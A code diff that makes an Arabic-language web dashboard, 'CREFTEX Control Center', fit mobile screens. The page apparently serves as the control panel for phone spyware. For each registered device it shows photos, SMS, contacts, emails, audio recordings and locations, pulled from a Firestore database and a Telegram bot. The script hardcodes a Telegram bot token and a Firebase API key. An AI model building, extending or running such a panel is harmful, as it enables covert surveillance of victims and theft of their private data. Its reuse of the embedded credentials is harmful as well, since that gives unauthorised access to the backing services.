@@ -2,7 +2,8 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=1180, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#0a0f1a">
     <title>CREFTEX — Control Center</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
@@ -19,190 +20,246 @@
             --green: #10b981;
             --purple: #8b5cf6;
             --red: #ef4444;
-            --yellow: #f59e0b;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        html, body {
+            overflow-x: hidden;
+            width: 100%;
+            max-width: 100vw;
+        }
         body {
             background: linear-gradient(180deg, #0a0f1a, #050810);
             color: var(--text);
             min-height: 100vh;
-            padding: 20px;
+            padding: 12px;
+            padding-bottom: 30px;
+            font-size: 14px;
         }
-        .app { width: 1180px; max-width: 100%; margin: 0 auto; }
+        .app {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
 
         /* Header */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px 24px;
+            padding: 14px 16px;
             background: rgba(19, 30, 47, 0.8);
             border: 1px solid var(--border);
-            border-radius: 20px;
-            margin-bottom: 20px;
+            border-radius: 16px;
+            margin-bottom: 14px;
         }
-        .brand { display: flex; align-items: center; gap: 14px; }
+        .brand { display: flex; align-items: center; gap: 10px; }
         .brand-logo {
-            width: 50px; height: 50px;
-            border-radius: 14px;
+            width: 42px; height: 42px;
+            border-radius: 12px;
             background: linear-gradient(135deg, var(--accent), var(--cyan));
             display: flex; align-items: center; justify-content: center;
-            font-size: 24px;
+            font-size: 20px;
+            flex-shrink: 0;
         }
         .brand h1 {
-            font-size: 22px; font-weight: 800;
+            font-size: 17px; font-weight: 800;
             background: linear-gradient(135deg, #60a5fa, #22d3ee);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            line-height: 1.2;
         }
-        .brand p { font-size: 12px; color: var(--dim); }
+        .brand p { font-size: 10px; color: var(--dim); }
+        .refresh-btn {
+            padding: 8px 14px;
+            background: rgba(59, 130, 246, 0.15);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            color: var(--accent);
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            flex-shrink: 0;
+        }
+        .refresh-btn:active { transform: scale(0.95); }
 
         /* Stats */
         .stats {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 14px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 14px;
         }
         .stat {
             background: var(--card);
             border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 18px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
+            border-radius: 14px;
+            padding: 12px 6px;
+            text-align: center;
         }
         .stat .icon {
-            width: 46px; height: 46px;
-            border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 22px;
-            background: rgba(59, 130, 246, 0.15);
+            font-size: 20px;
+            margin-bottom: 4px;
         }
-        .stat .info { flex: 1; }
         .stat .num {
-            font-size: 28px; font-weight: 800;
+            font-size: 20px; font-weight: 800;
             color: var(--cyan);
+            line-height: 1;
         }
-        .stat .lbl { font-size: 12px; color: var(--dim); }
+        .stat .lbl {
+            font-size: 10px;
+            color: var(--dim);
+            margin-top: 4px;
+        }
 
-        /* Devices List */
+        /* Section title */
         .section-title {
-            display: flex; align-items: center; gap: 10px;
-            font-size: 18px; font-weight: 700;
-            margin: 24px 0 14px;
+            display: flex; align-items: center; gap: 8px;
+            font-size: 15px; font-weight: 700;
+            margin: 16px 0 10px;
+            padding: 0 4px;
         }
         .section-title .count {
             background: var(--accent);
             color: #fff;
-            padding: 2px 10px;
+            padding: 2px 8px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
         }
+
+        /* Devices List */
         .devices {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 14px;
-            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 16px;
         }
         .device {
             background: linear-gradient(160deg, #142231 0%, #131e30 60%, #1b1830 100%);
             border: 2px solid transparent;
             background-clip: padding-box;
-            border-radius: 20px;
-            padding: 18px;
+            border-radius: 18px;
+            padding: 14px;
             cursor: pointer;
             position: relative;
-            transition: all 0.2s;
+            transition: all 0.15s;
         }
         .device::before {
             content: ""; position: absolute; inset: -2px;
-            border-radius: 22px; z-index: -1;
+            border-radius: 20px; z-index: -1;
             background: linear-gradient(120deg, #00afff, #2e7fe8 40%, #8b3dff 75%, #b33cff);
         }
         .device.inactive::before {
             background: linear-gradient(120deg, #5a2020, #8b2d2d 40%, #b33c3c 75%, #d84c4c);
         }
-        .device:hover { transform: translateY(-3px); }
+        .device:active { transform: scale(0.98); }
         .device .status {
             position: absolute; top: 12px; left: 12px;
-            width: 10px; height: 10px;
+            width: 9px; height: 9px;
             border-radius: 50%;
             background: var(--green);
-            box-shadow: 0 0 12px rgba(16, 185, 129, 0.9);
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.9);
         }
         .device.inactive .status {
             background: var(--red);
-            box-shadow: 0 0 12px rgba(239, 68, 68, 0.9);
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.9);
         }
         .device .name {
-            font-size: 17px; font-weight: 800;
-            margin-bottom: 8px;
+            font-size: 15px; font-weight: 800;
+            margin-bottom: 6px;
             direction: ltr;
             text-align: left;
+            padding-left: 16px;
+            word-break: break-word;
         }
         .device .meta {
-            font-size: 12px; color: var(--dim);
+            font-size: 11px; color: var(--dim);
             direction: ltr;
             text-align: left;
             font-family: 'Courier New', monospace;
+            word-break: break-all;
+            padding-left: 16px;
         }
 
-        /* Device Detail Panel */
+        /* Detail Panel */
         .detail {
             display: none;
             background: var(--card);
             border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 24px;
-            margin-bottom: 20px;
+            border-radius: 18px;
+            padding: 14px;
+            margin-bottom: 14px;
         }
         .detail.open { display: block; }
         .detail-head {
             display: flex; justify-content: space-between; align-items: center;
-            padding-bottom: 16px;
+            padding-bottom: 12px;
             border-bottom: 1px solid var(--border);
-            margin-bottom: 20px;
+            margin-bottom: 14px;
+            gap: 10px;
         }
-        .detail-title { display: flex; align-items: center; gap: 14px; }
+        .detail-title {
+            display: flex; align-items: center; gap: 10px;
+            min-width: 0;
+            flex: 1;
+        }
         .detail-title .avatar {
-            width: 60px; height: 60px;
-            border-radius: 16px;
+            width: 44px; height: 44px;
+            border-radius: 12px;
             background: linear-gradient(135deg, var(--accent), var(--cyan));
             display: flex; align-items: center; justify-content: center;
-            font-size: 28px;
+            font-size: 22px;
+            flex-shrink: 0;
         }
-        .detail-title h2 { font-size: 20px; }
-        .detail-title p { font-size: 12px; color: var(--dim); direction: ltr; }
+        .detail-title h2 {
+            font-size: 15px;
+            word-break: break-word;
+        }
+        .detail-title p {
+            font-size: 10px; color: var(--dim);
+            direction: ltr;
+            word-break: break-all;
+        }
         .close-btn {
-            padding: 8px 16px;
+            padding: 6px 12px;
             background: rgba(239, 68, 68, 0.15);
             border: 1px solid rgba(239, 68, 68, 0.4);
             color: var(--red);
-            border-radius: 10px;
-            font-size: 13px;
+            border-radius: 8px;
+            font-size: 11px;
             font-weight: 700;
             cursor: pointer;
             font-family: inherit;
+            flex-shrink: 0;
         }
 
         /* Tabs */
         .tabs {
-            display: flex; gap: 8px;
-            margin-bottom: 18px;
-            flex-wrap: wrap;
+            display: flex; gap: 6px;
+            margin-bottom: 14px;
+            overflow-x: auto;
+            scrollbar-width: none;
+            padding-bottom: 4px;
+            -webkit-overflow-scrolling: touch;
         }
+        .tabs::-webkit-scrollbar { display: none; }
         .tab {
-            padding: 10px 18px;
+            padding: 8px 14px;
             background: var(--card-2);
             border: 1px solid var(--border);
-            border-radius: 12px;
+            border-radius: 10px;
             color: var(--dim);
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 700;
             cursor: pointer;
             font-family: inherit;
-            display: flex; align-items: center; gap: 6px;
+            white-space: nowrap;
+            flex-shrink: 0;
         }
         .tab.on {
             background: linear-gradient(135deg, var(--accent), #2563eb);
@@ -211,105 +268,122 @@
         }
 
         /* Tab Content */
-        .tab-content {
-            display: none;
-        }
+        .tab-content { display: none; }
         .tab-content.on { display: block; }
 
-        /* Gallery (Images Grid) */
+        /* Gallery */
         .gallery {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
         }
         .gallery img {
             width: 100%;
             aspect-ratio: 1;
             object-fit: cover;
-            border-radius: 12px;
+            border-radius: 10px;
             cursor: pointer;
             border: 1px solid var(--border);
+            background: var(--card-2);
             transition: transform 0.15s;
         }
-        .gallery img:hover { transform: scale(1.03); }
+        .gallery img:active { transform: scale(0.96); }
 
-        /* List (for SMS, contacts, etc.) */
+        /* List */
         .list {
             display: flex;
             flex-direction: column;
-            gap: 10px;
-            max-height: 600px;
+            gap: 8px;
+            max-height: 500px;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
         .list-item {
             background: var(--card-2);
             border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 14px;
-            font-size: 14px;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 13px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
         }
         .list-item .title {
             font-weight: 700;
             color: var(--cyan);
             margin-bottom: 6px;
+            font-size: 13px;
         }
         .list-item .text {
             color: var(--text);
             line-height: 1.6;
-            font-size: 13px;
+            font-size: 12px;
+            word-break: break-word;
+            white-space: pre-wrap;
         }
         .list-item .meta {
-            font-size: 11px;
+            font-size: 10px;
             color: var(--dim);
             margin-top: 6px;
+            direction: ltr;
+        }
+        .list-item audio {
+            width: 100%;
+            margin-top: 8px;
+            height: 36px;
         }
 
         .empty {
             text-align: center;
-            padding: 60px 20px;
+            padding: 40px 20px;
             color: var(--dim);
         }
-        .empty .icon { font-size: 60px; margin-bottom: 12px; opacity: 0.4; }
+        .empty .icon { font-size: 44px; margin-bottom: 10px; opacity: 0.4; }
+        .empty div:last-child { font-size: 13px; }
 
-        /* Modal for full image */
+        /* Modal */
         .modal {
             position: fixed; inset: 0;
             background: rgba(0, 0, 0, 0.95);
             display: none;
             align-items: center; justify-content: center;
             z-index: 9999;
-            padding: 30px;
+            padding: 16px;
         }
         .modal.show { display: flex; }
-        .modal img { max-width: 100%; max-height: 90vh; border-radius: 16px; }
+        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
         .modal-close {
-            position: absolute; top: 20px; right: 20px;
-            width: 44px; height: 44px;
+            position: absolute; top: 16px; right: 16px;
+            width: 40px; height: 40px;
             border-radius: 50%;
             background: rgba(255, 255, 255, 0.1);
             border: none;
             color: #fff;
-            font-size: 24px;
+            font-size: 22px;
             cursor: pointer;
         }
 
         /* Toast */
         .toast {
             position: fixed;
-            bottom: 24px; left: 50%;
+            bottom: 20px; left: 50%;
             transform: translateX(-50%) translateY(100px);
-            padding: 14px 24px;
-            border-radius: 14px;
+            padding: 12px 20px;
+            border-radius: 12px;
             background: rgba(19, 30, 47, 0.95);
             border: 1px solid var(--border);
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 700;
             transition: transform 0.3s;
             z-index: 9999;
+            max-width: 90vw;
+            text-align: center;
         }
         .toast.show { transform: translateX(-50%) translateY(0); }
         .toast.ok { border-color: var(--green); color: var(--green); }
         .toast.err { border-color: var(--red); color: var(--red); }
+
+        /* Fix iOS zoom */
+        input, textarea, select, button { font-size: 16px; }
     </style>
 </head>
 <body>
@@ -323,107 +397,91 @@
                 <p>CONTROL CENTER</p>
             </div>
         </div>
-        <button class="close-btn" onclick="loadAll()">🔄 تحديث</button>
+        <button class="refresh-btn" onclick="loadAll()">🔄</button>
     </div>
 
     <!-- Stats -->
     <div class="stats">
         <div class="stat">
             <div class="icon">📱</div>
-            <div class="info">
-                <div class="num" id="statDevices">0</div>
-                <div class="lbl">الأجهزة</div>
-            </div>
+            <div class="num" id="statDevices">0</div>
+            <div class="lbl">الأجهزة</div>
         </div>
         <div class="stat">
-            <div class="icon" style="background: rgba(34, 211, 238, 0.15);">📸</div>
-            <div class="info">
-                <div class="num" id="statPhotos" style="color: var(--cyan);">0</div>
-                <div class="lbl">الصور</div>
-            </div>
+            <div class="icon">📸</div>
+            <div class="num" id="statPhotos" style="color: var(--cyan);">0</div>
+            <div class="lbl">الصور</div>
         </div>
         <div class="stat">
-            <div class="icon" style="background: rgba(139, 92, 246, 0.15);">💬</div>
-            <div class="info">
-                <div class="num" id="statMessages" style="color: var(--purple);">0</div>
-                <div class="lbl">الرسائل</div>
-            </div>
+            <div class="icon">💬</div>
+            <div class="num" id="statMessages" style="color: var(--purple);">0</div>
+            <div class="lbl">الرسائل</div>
         </div>
     </div>
 
-    <!-- Devices List -->
+    <!-- Devices -->
     <div class="section-title">
         <span>📱 الأجهزة</span>
         <span class="count" id="deviceCount">0</span>
     </div>
     <div class="devices" id="devicesList">
-        <div class="empty" style="grid-column: 1/-1;">
+        <div class="empty">
             <div class="icon">📭</div>
             <div>لا أجهزة مسجّلة بعد</div>
         </div>
     </div>
 
-    <!-- Device Detail -->
+    <!-- Detail -->
     <div class="detail" id="detail">
         <div class="detail-head">
             <div class="detail-title">
-                <div class="avatar" id="detailAvatar">📱</div>
-                <div>
+                <div class="avatar">📱</div>
+                <div style="min-width:0;">
                     <h2 id="detailName">—</h2>
                     <p id="detailId">—</p>
                 </div>
             </div>
-            <button class="close-btn" onclick="closeDetail()">✕ إغلاق</button>
+            <button class="close-btn" onclick="closeDetail()">✕</button>
         </div>
 
         <div class="tabs">
-            <button class="tab on" onclick="switchTab(this, 'photos')">📸 الصور</button>
+            <button class="tab on" onclick="switchTab(this, 'photos')">📸 صور</button>
             <button class="tab" onclick="switchTab(this, 'sms')">📩 SMS</button>
-            <button class="tab" onclick="switchTab(this, 'contacts')">👥 جهات الاتصال</button>
-            <button class="tab" onclick="switchTab(this, 'emails')">📧 الإيميلات</button>
-            <button class="tab" onclick="switchTab(this, 'music')">🎵 الموسيقى</button>
-            <button class="tab" onclick="switchTab(this, 'location')">📍 الموقع</button>
+            <button class="tab" onclick="switchTab(this, 'contacts')">👥 جهات</button>
+            <button class="tab" onclick="switchTab(this, 'emails')">📧 إيميل</button>
+            <button class="tab" onclick="switchTab(this, 'music')">🎵 صوت</button>
+            <button class="tab" onclick="switchTab(this, 'location')">📍 موقع</button>
         </div>
 
         <div class="tab-content on" id="tab-photos">
             <div class="gallery" id="photosGrid"></div>
         </div>
-
         <div class="tab-content" id="tab-sms">
             <div class="list" id="smsList"></div>
         </div>
-
         <div class="tab-content" id="tab-contacts">
             <div class="list" id="contactsList"></div>
         </div>
-
         <div class="tab-content" id="tab-emails">
             <div class="list" id="emailsList"></div>
         </div>
-
         <div class="tab-content" id="tab-music">
             <div class="list" id="musicList"></div>
         </div>
-
         <div class="tab-content" id="tab-location">
             <div class="list" id="locationList"></div>
         </div>
     </div>
 </div>
 
-<!-- Image Modal -->
 <div class="modal" id="imgModal" onclick="closeModal()">
     <button class="modal-close">×</button>
     <img id="modalImg" src="" alt="">
 </div>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
 <script>
-// ═══════════════════════════════════════════
-//  الإعدادات
-// ═══════════════════════════════════════════
 const TELEGRAM_BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
 const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
 const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";
@@ -437,33 +495,23 @@ let currentDevice = null;
 let allMessages = [];
 let deviceNames = JSON.parse(localStorage.getItem('device_names') || '{}');
 
-// ═══════════════════════════════════════════
-//  Toast
-// ═══════════════════════════════════════════
 function toast(msg, type='ok') {
     const t = document.getElementById('toast');
     t.textContent = msg;
     t.className = 'toast show ' + type;
     clearTimeout(window.__tt);
-    window.__tt = setTimeout(() => t.classList.remove('show'), 2500);
+    window.__tt = setTimeout(() => t.classList.remove('show'), 2200);
 }
 
-// ═══════════════════════════════════════════
-//  Load Devices
-// ═══════════════════════════════════════════
 async function loadDevices() {
     try {
         const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
         const data = await res.json();
         const docs = data.documents || [];
-
         const list = document.getElementById('devicesList');
 
         if (docs.length === 0) {
-            list.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
-                <div class="icon">📭</div>
-                <div>لا أجهزة مسجّلة بعد</div>
-            </div>`;
+            list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا أجهزة مسجّلة بعد</div></div>`;
             document.getElementById('statDevices').textContent = '0';
             document.getElementById('deviceCount').textContent = '0';
             return;
@@ -488,9 +536,7 @@ async function loadDevices() {
 
         list.innerHTML = '';
         for (const d of devices) list.appendChild(buildDeviceCard(d));
-    } catch (e) {
-        console.error(e);
-    }
+    } catch (e) { console.error(e); }
 }
 
 function buildDeviceCard(d) {
@@ -499,7 +545,6 @@ function buildDeviceCard(d) {
     card.onclick = () => openDevice(d);
 
     const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
-
     card.innerHTML = `
         <div class="status"></div>
         <div class="name">${escapeHtml(customName)}</div>
@@ -509,23 +554,17 @@ function buildDeviceCard(d) {
     return card;
 }
 
-// ═══════════════════════════════════════════
-//  Open Device
-// ═══════════════════════════════════════════
 async function openDevice(d) {
     currentDevice = d;
     const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
-
     document.getElementById('detailName').textContent = customName;
     document.getElementById('detailId').textContent = d.id;
     document.getElementById('detail').classList.add('open');
-    document.getElementById('detail').scrollIntoView({ behavior: 'smooth' });
-
-    // Load messages
+    document.getElementById('detail').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    toast('⏳ جلب البيانات...');
     await loadMessages();
-
-    // Render photos (default tab)
     renderPhotos();
+    toast('✅ تم التحميل');
 }
 
 function closeDetail() {
@@ -533,17 +572,11 @@ function closeDetail() {
     currentDevice = null;
 }
 
-// ═══════════════════════════════════════════
-//  Tabs
-// ═══════════════════════════════════════════
 function switchTab(el, tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
     el.classList.add('on');
-
     document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('on'));
     document.getElementById('tab-' + tabName).classList.add('on');
-
-    // Re-render specific tab
     if (tabName === 'photos') renderPhotos();
     else if (tabName === 'sms') renderSms();
     else if (tabName === 'contacts') renderContacts();
@@ -552,12 +585,9 @@ function switchTab(el, tabName) {
     else if (tabName === 'location') renderLocation();
 }
 
-// ═══════════════════════════════════════════
-//  Load Messages
-// ═══════════════════════════════════════════
 async function loadMessages() {
     try {
-        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`);
+        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=1000`);
         const data = await res.json();
         allMessages = (data.documents || []).map(d => {
             const f = d.fields || {};
@@ -573,26 +603,17 @@ async function loadMessages() {
 
         document.getElementById('statMessages').textContent = allMessages.length;
         document.getElementById('statPhotos').textContent = allMessages.filter(m => m.type === 'photo').length;
-    } catch (e) {
-        console.error(e);
-    }
+    } catch (e) { console.error(e); }
 }
 
-// ═══════════════════════════════════════════
-//  Render Photos (Gallery Grid)
-// ═══════════════════════════════════════════
 function renderPhotos() {
     const grid = document.getElementById('photosGrid');
     const photos = allMessages.filter(m => m.type === 'photo' && m.file_id);
 
     if (photos.length === 0) {
-        grid.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
-            <div class="icon">📭</div>
-            <div>لا توجد صور</div>
-        </div>`;
+        grid.innerHTML = `<div class="empty" style="grid-column: 1/-1;"><div class="icon">📭</div><div>لا توجد صور</div></div>`;
         return;
     }
-
     grid.innerHTML = '';
     for (const p of photos) {
         const img = document.createElement('img');
@@ -604,20 +625,16 @@ function renderPhotos() {
     }
 }
 
-// ═══════════════════════════════════════════
-//  Render SMS
-// ═══════════════════════════════════════════
 function renderSms() {
     const list = document.getElementById('smsList');
-    const sms = allMessages.filter(m => m.type === 'sms' || (m.text && m.text.includes('📩 SMS من')));
+    const sms = allMessages.filter(m => m.type === 'sms' || (m.text && m.text.includes('📩 SMS')));
 
     if (sms.length === 0) {
         list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد رسائل SMS</div></div>`;
         return;
     }
-
     list.innerHTML = '';
-    for (const s of sms) {
+    for (const s of sms.reverse()) {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `
@@ -629,24 +646,19 @@ function renderSms() {
     }
 }
 
-// ═══════════════════════════════════════════
-//  Render Contacts
-// ═══════════════════════════════════════════
 function renderContacts() {
     const list = document.getElementById('contactsList');
-    const contacts = allMessages.filter(m => m.text && m.text.includes('👥'));
-
+    const contacts = allMessages.filter(m => m.text && (m.text.includes('👥') || m.text.includes('👤')));
     if (contacts.length === 0) {
         list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد جهات اتصال</div></div>`;
         return;
     }
-
     list.innerHTML = '';
-    for (const c of contacts) {
+    for (const c of contacts.reverse()) {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `
-            <div class="text">${escapeHtml(c.text)}</div>
+            <div class="text">${escapeHtml(c.text).replace(/\n/g, '<br>')}</div>
             <div class="meta">${new Date(c.time_ms).toLocaleString('ar-EG')}</div>
         `;
         list.appendChild(div);
@@ -656,18 +668,16 @@ function renderContacts() {
 function renderEmails() {
     const list = document.getElementById('emailsList');
     const emails = allMessages.filter(m => m.text && m.text.includes('📧'));
-
     if (emails.length === 0) {
         list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد إيميلات</div></div>`;
         return;
     }
-
     list.innerHTML = '';
-    for (const e of emails) {
+    for (const e of emails.reverse()) {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `
-            <div class="text">${escapeHtml(e.text)}</div>
+            <div class="text">${escapeHtml(e.text).replace(/\n/g, '<br>')}</div>
             <div class="meta">${new Date(e.time_ms).toLocaleString('ar-EG')}</div>
         `;
         list.appendChild(div);
@@ -676,37 +686,32 @@ function renderEmails() {
 
 function renderMusic() {
     const list = document.getElementById('musicList');
-    const music = allMessages.filter(m => m.type === 'audio');
-
+    const music = allMessages.filter(m => m.type === 'audio' && m.file_id);
     if (music.length === 0) {
         list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد موسيقى</div></div>`;
         return;
     }
-
     list.innerHTML = '';
-    for (const m of music) {
+    for (const m of music.reverse()) {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `
             <div class="title">🎵 مقطع صوتي</div>
-            <audio controls data-file="${escapeAttr(m.file_id)}" style="width:100%;margin-top:8px"></audio>
+            <audio controls data-file="${escapeAttr(m.file_id)}"></audio>
             <div class="meta">${new Date(m.time_ms).toLocaleString('ar-EG')}</div>
         `;
         list.appendChild(div);
-        const audio = div.querySelector('audio');
-        loadMedia(m.file_id, audio);
+        loadMedia(m.file_id, div.querySelector('audio'));
     }
 }
 
 function renderLocation() {
     const list = document.getElementById('locationList');
     const locations = allMessages.filter(m => m.text && m.text.includes('📍'));
-
     if (locations.length === 0) {
         list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا يوجد موقع</div></div>`;
         return;
     }
-
     list.innerHTML = '';
     for (const l of locations.reverse()) {
         const div = document.createElement('div');
@@ -719,9 +724,6 @@ function renderLocation() {
     }
 }
 
-// ═══════════════════════════════════════════
-//  Media Loader
-// ═══════════════════════════════════════════
 async function loadMedia(fileId, el) {
     try {
         const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
@@ -732,9 +734,6 @@ async function loadMedia(fileId, el) {
     } catch (e) {}
 }
 
-// ═══════════════════════════════════════════
-//  Modal
-// ═══════════════════════════════════════════
 function openModal(src) {
     document.getElementById('modalImg').src = src;
     document.getElementById('imgModal').classList.add('show');
@@ -743,9 +742,6 @@ function closeModal() {
     document.getElementById('imgModal').classList.remove('show');
 }
 
-// ═══════════════════════════════════════════
-//  Helpers
-// ═══════════════════════════════════════════
 function escapeHtml(s) {
     return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
@@ -754,13 +750,15 @@ function escapeAttr(s) {
 }
 
 async function loadAll() {
-    toast('جاري التحديث...');
+    toast('⏳ تحديث...');
     await loadDevices();
-    if (currentDevice) await loadMessages();
-    toast('✅ تم التحديث', 'ok');
+    if (currentDevice) {
+        await loadMessages();
+        renderPhotos();
+    }
+    toast('✅ تم');
 }
 
-// Start
 loadDevices();
 setInterval(loadDevices, 30000);
 </script>
